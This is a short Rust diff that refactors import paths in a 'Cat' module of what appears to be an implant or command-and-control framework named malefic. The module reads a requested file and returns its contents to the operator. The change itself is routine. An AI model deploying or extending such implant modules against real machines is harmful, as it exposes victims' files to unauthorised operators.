@@ -1,7 +1,7 @@
 use async_trait::async_trait;
 use malefic_trait::module_impl;
 use crate::{check_request, Module, Result, check_field, TaskResult};
-use malefic_helper::protobuf::implantpb::spite::Body;
+use malefic_proto::proto::implantpb::spite::Body;
 
 pub struct Cat{}
 
@@ -15,7 +15,7 @@ impl Module for Cat {
         let filename = check_field!(request.input)?;
         let content = std::fs::read_to_string(filename)?;
 
-        let mut response = malefic_helper::protobuf::implantpb::Response::default();
+        let mut response = malefic_proto::proto::modulepb::Response::default();
         response.output = content;
 
         Ok(TaskResult::new_with_body(id, Body::Response(response)))
